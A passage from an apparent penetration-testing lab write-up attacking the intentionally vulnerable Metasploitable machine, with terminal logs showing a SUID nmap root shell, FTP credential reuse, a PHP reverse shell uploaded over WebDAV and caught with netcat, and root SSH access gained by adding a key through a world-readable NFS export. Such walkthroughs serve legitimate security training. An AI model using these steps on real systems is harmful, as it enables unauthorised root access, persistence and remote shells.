/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown

</pre>
</details>

One of the vulnerable file which has suid bit is nmap. this is an old version which has an interactive mode.

<details>
  <summary>nmap interactive</summary>

<pre>
&nbsp;

user@metasploitable:~$ ssh user@192.168.222.129
The authenticity of host '192.168.222.129 (192.168.222.129)' can't be established.
RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.222.129' (RSA) to the list of known hosts.
user@192.168.222.129's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Mon Mar 15 03:57:48 2021 from 192.168.222.130
user@metasploitable:~$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# whoami
root
sh-3.2# 

</pre>
</details>

Since we now discovered user credentials (user:user), let's try if it is the same credential for FTP

<details>
  <summary>FTP user + ssh</summary>

<pre>
&nbsp;
imd@kali:~/Desktop/test/metasp$ ftp 192.168.222.129
Connected to 192.168.222.129.
220 (vsFTPd 2.3.4)
Name (192.168.222.129:imd): user
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 07  2010 .
drwxr-xr-x    6 0        0            4096 Apr 16  2010 ..
-rw-------    1 1001     1001          240 Mar 16 08:37 .bash_history
-rw-r--r--    1 1001     1001          220 Mar 31  2010 .bash_logout
-rw-r--r--    1 1001     1001         2928 Mar 31  2010 .bashrc
-rw-r--r--    1 1001     1001          586 Mar 31  2010 .profile
drwx------    2 1001     1001         4096 Mar 15 08:10 .ssh
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> mget id_dsa
mget id_dsa? yes
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_dsa (668 bytes).
226 Transfer complete.
668 bytes received in 0.00 secs (1.3001 MB/s)
ftp> exit
221 Goodbye.

imd@kali:~/Desktop/test/metasp$ chmod 600 id_dsa 
imd@kali:~/Desktop/test/metasp$ ssh -i id_dsa 192.168.222.129
load pubkey "id_dsa": invalid format
sign_and_send_pubkey: no mutual signature supported
imd@192.168.222.129's password: 

</pre>
</details>

Our attempt was unsuccessful. The private key should not ask for the password. What if we upload our kali linux key to there?

<details>
  <summary>upload ssh key + ftp</summary>

<pre>
&nbsp;
imd@kali:~/.ssh$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/imd/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/imd/.ssh/id_rsa
Your public key has been saved in /home/imd/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:L5pkx5hK9jHROa50HSI9hlSveNeKj+cLNxyW6zdsXLo imd@kali
The key's randomart image is:
+---[RSA 3072]----+
|        .        |
|       . .       |
|      .   .      |
|     . = o o     |
|      = S * .    |
|       X @ =  .  |
|    o O O Oo o   |
|   o * O B..B    |
|    . = .o=+Eo   |
+----[SHA256]-----+
imd@kali:~/.ssh$ ls
authorized_keys.old  id_rsa  id_rsa.old  id_rsa.pub  id_rsa.pub.old  known_hosts
imd@kali:~/.ssh$ cat id_rsa.pub > authorized_keys
imd@kali:~/.ssh$ ftp 192.168.222.129
Connected to 192.168.222.129.
220 (vsFTPd 2.3.4)
Name (192.168.222.129:imd): user
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 07  2010 .
drwxr-xr-x    6 0        0            4096 Apr 16  2010 ..
-rw-------    1 1001     1001          252 Mar 16 22:32 .bash_history
-rw-r--r--    1 1001     1001          220 Mar 31  2010 .bash_logout
-rw-r--r--    1 1001     1001         2928 Mar 31  2010 .bashrc
-rw-r--r--    1 1001     1001          586 Mar 31  2010 .profile
drwx------    2 1001     1001         4096 Mar 15 08:10 .ssh
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001          668 May 07  2010 id_dsa
-rw-r--r--    1 1001     1001          609 May 07  2010 id_dsa.pub
-rw-r--r--    1 1001     1001          442 Mar 15 08:10 known_hosts
226 Directory send OK.
ftp> mput authorized_keys
mput authorized_keys? yes
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
562 bytes sent in 0.00 secs (741.6597 kB/s)
ftp> 

</pre>
</details>

Here are just couple of ways how you can gain shell privileges.

### 0x05 DNS

`53/tcp   open  domain      syn-ack ISC BIND 9.4.2`

Searching the current version of our DNS, ISC BIND 9.4.2 is not vulnerable. There is no additional attack that you can do on port 53. However I will just list some attack vectors that you can apply to other boxes or machines that you will penetrate.

1. DNS Cahce poisoning - Whenever user will ping to example.com, the request will not go through the original server but will route to the attacker's server, then going to the main server. So the attacker can easily see what the user is doing on the specific server. 
2. Zone transfer - it is a replicate of name server records from one dns server to another. For a quick hands on experience why you should never allow zone transfer on your domain, refer to this [link](https://digi.ninja/projects/zonetransferme.php).
3. Version related issues

### 0x06 HTTP

Now go visit the host like how your normally visit a website in a HTTP protocol. http://192.168.222.130

<details>
  <summary>nikto scan</summary>

<pre>
&nbsp;
imd@kali:/usr/share/webshells$ nikto -h http://192.168.222.129/dav
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.222.129
+ Target Hostname:    192.168.222.129
+ Target Port:        80
+ Start Time:         2021-03-17 03:35:06 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /dav/: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /dav/nikto-test-eQD6yPWJ.html, inode: W/10829, size: 16, mtime: 5bdb6857fdc40
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Retrieved dav header: ARRAY(0x55a4c1065cf8)
+ Retrieved ms-author-via header: DAV
+ Uncommon header 'ms-author-via' found, with contents: DAV
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE, DELETE, PROPFIND, PROPPATCH, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPPATCH UNLOCK PROPFIND LOCK COPY listed as allowed)
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /dav/./: Directory indexing found.
+ /dav/./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: /dav//: Directory indexing found.
+ /dav//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /dav/%2e/: Directory indexing found.
+ OSVDB-576: /dav/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: /dav///: Directory indexing found.
+ OSVDB-119: /dav/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-119: /dav/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-3268: /dav///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: /dav///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
+ 7916 requests: 0 error(s) and 26 item(s) reported on remote host
+ End Time:           2021-03-17 03:35:26 (GMT-4) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

</pre>
</details>

We scanned and confirmed that there is a PUT method that is allowed. This means we can upload files on this directory. Let's upload our shell using cadaver.

<details>
  <summary>upload files using cadaver</summary>

<pre>
&nbsp;
imd@kali:/usr/share/webshells/php$ cp php-reverse-shell.php ~/Desktop/test/metasp/rev.php
imd@kali:/usr/share/webshells/php$ cd ~/Desktop/test/metasp/
imd@kali:~/Desktop/test/metasp$ subl rev.php 

imd@kali:~/Desktop/test/metasp$ sudo cadaver http://192.168.222.129/dav
[sudo] password for imd: 
dav:/dav/> put /home/imd/Desktop/test/metasp/rev.php 
Uploading /home/imd/Desktop/test/metasp/rev.php to `/dav/rev.php':
Progress: [=============================>] 100.0% of 3465 bytes succeeded.
dav:/dav/> 

</pre>
</details>

![][2]

Right after we uploaded the file, let's listen to the port that we configured on our reverse shell. (port 1234)

<details>
  <summary>nc port 1234</summary>

<pre>
&nbsp;
imd@kali:~/Desktop/test/metasp$ nc -lvp 1234
listening on [any] 1234 ...
192.168.222.129: inverse host lookup failed: Unknown host
connect to [192.168.222.130] from (UNKNOWN) [192.168.222.129] 55501
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 21:37:53 up 4 days, 18:14,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    :0.0             Wed03    4days  0.00s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: no job control in this shell
sh-3.2$ whoami
www-data
sh-3.2$ 

</pre>
</details>

### 0x07 Rpcinfo/NFS

RPC (port 111) is a remote procedure call port. This is an awesome port which is telling us how many services in our network which are running through procedures. There are some common services we see through remote procedure is NFS (Network File Share). DHCP is another example that is present in our router to list out the DHCP clients. When you do REST API call, that is also happening through RPC. NFS doesn't support Windows, it only support Linux operating system.

How to identify if NFS is enabled on your network or not?
- type `rpcinfo 192.168.222.129` 

<details>
  <summary>rpcinfo</summary>

<pre>
&nbsp;
imd@kali:~/Desktop/test/metasp$ sudo rpcinfo 192.168.222.129
   program version netid     address                service    owner
    100000    2    tcp       0.0.0.0.0.111          portmapper unknown
    100000    2    udp       0.0.0.0.0.111          portmapper unknown
    100024    1    udp       0.0.0.0.201.222        status     unknown
    100024    1    tcp       0.0.0.0.223.144        status     unknown
    100003    2    udp       0.0.0.0.8.1            nfs        unknown
    100003    3    udp       0.0.0.0.8.1            nfs        unknown
    100003    4    udp       0.0.0.0.8.1            nfs        unknown
    100021    1    udp       0.0.0.0.169.147        nlockmgr   unknown
    100021    3    udp       0.0.0.0.169.147        nlockmgr   unknown
    100021    4    udp       0.0.0.0.169.147        nlockmgr   unknown
    100003    2    tcp       0.0.0.0.8.1            nfs        unknown
    100003    3    tcp       0.0.0.0.8.1            nfs        unknown
    100003    4    tcp       0.0.0.0.8.1            nfs        unknown
    100021    1    tcp       0.0.0.0.187.195        nlockmgr   unknown
    100021    3    tcp       0.0.0.0.187.195        nlockmgr   unknown
    100021    4    tcp       0.0.0.0.187.195        nlockmgr   unknown
    100005    1    udp       0.0.0.0.200.231        mountd     unknown
    100005    1    tcp       0.0.0.0.187.182        mountd     unknown
    100005    2    udp       0.0.0.0.200.231        mountd     unknown
    100005    2    tcp       0.0.0.0.187.182        mountd     unknown
    100005    3    udp       0.0.0.0.200.231        mountd     unknown
    100005    3    tcp       0.0.0.0.187.182        mountd     unknown

</pre>
</details>

You can see here locally how many services listed in the remote server. So portmapper is running, it is just to mapping out the remote services and here you see that NFS is running. Now what do you need to do here? you need to figure out the NFS service. There is a port called 2049. It is a port which has a network file share servicNFS in your network, sometimes, due to trust or let's say due to productions, we usually foget to remove the shares after a certain period of time. 

<details>
 <summary>showmount</summary>

<pre>
&nbsp;
imd@kali:~/Desktop/test/metasp$ sudo showmount -e 192.168.222.129
Export list for 192.168.222.129:
/ *

imd@kali:~/Desktop/test/metasp$ sudo mount -t nfs 192.168.222.129:/ /tmp/mount
imd@kali:~/Desktop/test/metasp$ cd /tmp/mount
imd@kali:/tmp/mount$ ls
bin   cdrom  etc   initrd      lib         media  nohup.out  proc  sbin  sys  usr  vmlinuz
boot  dev    home  initrd.img  lost+found  mnt    opt        root  srv   tmp  var

</pre>
</details>

Star or asterisk means all. The entire root directory. So now, how to take reverse shell on it?
We are interested on .ssh directory. We have an authorized_keys here, so can we do now? Let's generate our kali ssh key.

<details>
  <summary>generate ssh key</summary>

<pre>
&nbsp;
imd@kali:~/.ssh$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/imd/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/imd/.ssh/id_rsa
Your public key has been saved in /home/imd/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:owUb1cVHMfaVL6/pILlxRSkdyMAQd/our4Z0m+efNFg imd@kali
The key's randomart image is:
+---[RSA 3072]----+
|        +=o=oo*.o|
|       . .oo+o.*.|
|      o   . ..+ o|
|       +   . o. .|
|      . S   . Eo |
|       o...o +  .|
|      .. o=o= oo |
|        . +B.ooo |
|         .o+oo+  |
+----[SHA256]-----+

</pre>
</details>

And here is a kali ssh key. What we'll do is to copy the ssh key into the host and we will login via our private key because we're supposed to replace root users credential. How can we do this?

<details>
  <summary>generate and copy ssh key</summary>

<pre>
&nbsp;
imd@kali:/tmp/mount/root/.ssh$ cat /home/imd/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKtOjvGX2GTil9mj23vimZ3FxqSVHqNZWTN3+OGDE/qfufiQvnQTYcLnEaL02vJTzXqK605JnmVJtNHuls598ZipM47jgCQ77kpNfT9of8GLQX6NJv0F9jH4EisbuQFvjG82sLHYtlTHy0pNWhyxraXnlBxn3sSWMo/c9kr7YYqFDJLO0lcUOiwEsW3DB+dBYtNV4Nske0oHucCKWUb+lr7YI/6b7CE6m2L1szVLBzDPPO2CSwk6tJDpaehrQBfwd6ZhKx6/jTcjVkXZaW5+4em5Nuf1aku0UMIXTCKrn4hw47eRn7OAxpg7xNHCco3GsUfxrZInvdjpCD85UabCteie8u1NnGhQN2HdMeLdeEGAbzxt9CFkQkslqcvNcZ3hKEenTKLrHjg9rTafvcgtmdb2xcvD+Z8T/80Syesq0SRquqdsWLtoaruQ9Dcwd+u9cAg9qAc2udAhnp2b+yICXEM+DjXXiBXDdZSFkaVts432bUcDnSbI2+d/R3F8Amacc= imd@kali
imd@kali:/tmp/mount/root/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
imd@kali:/tmp/mount/root/.ssh$ subl authorized_keys 

</pre>
</details>

In authorized_keys once we added the public key, go back to kali and just type `ssh -i id_rsa root@192.168.222.129` 

<details>
  <summary>connect to ssh</summary>

<pre>
&nbsp;
imd@kali:~/.ssh$ ssh -i id_rsa root@192.168.222.129
Last login: Wed Mar 17 03:23:16 2021 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# 

</pre>
</details>

### 0x08 Rlogin

Rlogin uses port 513. Do you remember a hacking story behind rlogin? It was an old book but still fun to read. 



[1]: https://i.imgur.com/QQ05FAu.png
[2]: https://i.imgur.com/Ac0tzpT.png







